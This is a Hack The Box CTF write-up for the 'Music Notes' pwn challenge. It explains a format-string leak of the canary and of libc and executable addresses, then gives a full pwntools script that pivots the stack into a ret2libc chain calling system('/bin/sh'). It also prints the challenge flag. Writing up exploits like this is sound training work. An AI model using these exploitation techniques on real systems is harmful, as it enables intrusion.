# Music Notes

## Challenge

A format string vulnerability and a buffer overflow.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

We can use the format string to leak important values, including a stack address, libc address, exe address, and the canary.

Now, we can send a ret2libc payload and place it in the buffer.

We can't put the ROP chain directly under RBP due to the limited length of our overflow.

But it is enough to pivot the stack onto our buffer, where we placed our ROP chain earlier, and return to a `leave; ret;` gadget.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 139.59.180.40 --port 31485 music_notes
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('music_notes')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.62.18.237'
port = int(args.PORT or 30721)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def sendnote(target):
    io.recvuntil(b"\n1. ")
    note = io.recv(1)
    num = 1
    if note != target:
        num = 2
    io.sendlineafter(b"> ", str(num).encode())

sendnote(b"D")
sendnote(b"B")
sendnote(b"A")
sendnote(b"G")
sendnote(b"D")

exe_stack = 0x108 // 0x8 + 6
libc_stack = 0x128 // 0x8 + 6
pivot_stack = 0x90 // 0x8 + 6
canary_stack = 0xc8 // 0x8 + 6

io.sendlineafter(b"> ", "\n%{}$p\n%{}$p\n%{}$p\n%{}$p".format(
    exe_stack,
    libc_stack,
    pivot_stack,
    canary_stack
    ).encode())
io.recvuntil(b"So, your name is: \n")

exe.address = int(io.recvline()[:-1], 0) - 0x00000fd1
libc.address = int(io.recvline()[:-1], 0) - libc.libc_start_main_return
pivot = int(io.recvline()[:-1], 0) + 0x98
canary = int(io.recvline()[:-1], 0)

log.success("exe: " + hex(exe.address))
log.success("libc: " + hex(libc.address))
log.success("pivot: " + hex(pivot))
log.success("canary: " + hex(canary))

rop = ROP(exe)
payload = flat({
    0x0: [
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
        ],
    0x60 - 0x38: canary,
    0x60: pivot,
    0x60 + 0x8: rop.find_gadget(["leave", "ret"])[0],
    })

io.sendlineafter(b":", payload)

io.interactive()
```

## Flag

`HTB{j1ngl3_b3ll5_j1ngl3_b3ll5_j1ngl3_f0rm4t_5tr1ng}`
